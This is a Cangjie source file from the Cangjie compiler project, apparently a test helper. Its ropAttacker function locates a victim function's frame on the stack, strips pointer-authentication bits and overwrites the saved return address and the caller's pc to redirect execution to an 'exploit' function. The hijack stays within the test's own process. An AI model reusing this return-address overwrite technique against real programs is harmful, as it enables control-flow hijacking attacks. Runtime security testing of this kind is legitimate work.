/*
 * Copyright (c) Huawei Technologies Co., Ltd. 2025. All rights reserved.
 * This source file is part of the Cangjie project, licensed under Apache-2.0
 * with Runtime Library Exception.
 *
 * See https://cangjie-lang.cn/pages/LICENSE for license information.
 */

import std.convert.*

// we acquire pointer as UInt64 to do some math and overwrite operation
foreign func dlsym(handle: UInt64, symbol: CString): UInt64

const RTLD_DEFAULT: UInt64 = 0
const PAC_MASK: UInt64 = (1 << 48) - 1

@C
public struct ExploitConfig {
    // make sure it is larger than acutal frame size
    public let victimFrameSize: Int64
    // make sure it is aligned, otherwise it will SIGILL
    public let returnAddressAddon: UInt64
    // make sure victim and exploit function are not inlined by compiler
    // !! here is a mem leak, but doesn't matter since it will crash after rop !!
    public let victimMangleName: CString
    public let exploitMangleName: CString

    public init(victimFrameSize!: Int64, returnAddressAddon!: UInt64, victimMangleName!: CString,
        exploitMangleName!: CString) {
        this.victimFrameSize = victimFrameSize
        this.returnAddressAddon = returnAddressAddon
        this.victimMangleName = victimMangleName
        this.exploitMangleName = exploitMangleName
    }

    public init(victimFrameSize!: Int64, returnAddressAddon!: UInt64, victimMangleName!: String,
        exploitMangleName!: String) {
        this.victimFrameSize = victimFrameSize
        this.returnAddressAddon = returnAddressAddon
        this.victimMangleName = unsafe { LibC.mallocCString(victimMangleName) }
        this.exploitMangleName = unsafe { LibC.mallocCString(exploitMangleName) }
    }
}

/**
 * How to use:
 *  1. Define let conf = ExploitConfig(...)
 *  2. Define exploit function: Unit which is used to execute exploited code
 *  3. Define victim function: define an anchor and pass it to attacker, e.g., ropAttacker(inout conf, inout anchor)
 */
private unsafe func findFunctionAddr(conf: ExploitConfig): (UInt64, UInt64) {
    // --link-options='--export-dynamic is needed for dlsym operation
    let exploitedAddr = dlsym(RTLD_DEFAULT, conf.exploitMangleName)
    println("[-] exploit function (${conf.exploitMangleName}) address: ${exploitedAddr.format("#x")}")

    let victimAddr = dlsym(RTLD_DEFAULT, conf.victimMangleName)
    println("[-] victim function (${conf.victimMangleName}) address: ${victimAddr.format("#x")}")

    return (exploitedAddr, victimAddr)
}

@C
public func ropAttacker(cp: CPointer<ExploitConfig>, p: CPointer<UInt64>): Unit {
    unsafe {
        let conf = cp.read()
        var (exploitedAddr, victimAddr) = findFunctionAddr(conf)
        if (exploitedAddr == 0 || victimAddr == 0) {
            println("[!] either exploited() or main() function address is not found")
            println("[!] ensure you pass option `--link-options='--export-dynamic'` and check function's mangle name")
            return
        }

        println("[*] Searching for start pc...")
        // victim frame size is not that large, search for limited area
        for (offset in 0..conf.victimFrameSize) {
            var stackVal = p.read(offset)
            // be aware that function pointer might be pac-signed, we need strip it out for comparison
            if ((stackVal & PAC_MASK) == (victimAddr & PAC_MASK)) {
                println("[-] found victim's start pc at anchor[${offset}]")
                println("[-] pc: anchor[${offset}] = ${stackVal.format("#x")}")
                println("[-] fp: anchor[${offset + 1}] = ${p.read(offset + 1).format("#x")}")
                println("[-] ra: anchor[${offset + 2}] = ${p.read(offset + 2).format("#x")}")
                println("[+] start exploit...")

                println("[+] first, change victim's ra...")
                let raAddr = exploitedAddr + conf.returnAddressAddon
                println("[+] change victim's ra: ${p.read(offset + 2).format("#x")} -> ${raAddr.format("#x")}")
                p.write(offset + 2, raAddr)

                println("[+] second, change vitcim's caller's start pc...")
                let callerFp: CPointer<UInt64> = CPointer<CPointer<UInt64>>(p).read(offset + 1)
                println("[+] change caller's pc: ${callerFp.read(-1).format("#x")} -> ${exploitedAddr.format("#x")}")
                callerFp.write(-1, exploitedAddr)
                return
            }
        }
        println("[!] start pc position not found, possible solution:")
        println(
            "[!]     1. ${conf.victimMangleName}'s frame size is too large, you need change victimFrameSize (current: ${conf.victimFrameSize})")
        println("[!]     2. ${conf.victimMangleName} is inlined")
    }
}
